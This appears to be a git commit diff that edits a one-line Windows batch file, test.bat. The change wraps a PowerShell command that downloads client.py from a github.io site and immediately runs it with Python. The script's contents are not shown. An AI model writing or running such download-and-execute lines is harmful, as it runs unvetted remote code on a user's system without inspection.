9c1fa8653e2ed8579b78557a4f977e59ee10a316
roqols <92282813+roqols@users.noreply.github.com>
2025-08-11 01:48:11 -0300

    Update test.bat

--- arq/test.bat
+++ arq/test.bat
@@ -1,1 +1,1 @@
-Invoke-WebRequest 'https://roqols.github.io/Subvoid/arq/client.py' -OutFile 'client.py'; py client.py
+powershell -Command "Invoke-WebRequest 'https://roqols.github.io/Subvoid/arq/client.py' -OutFile 'client.py'; py client.py"
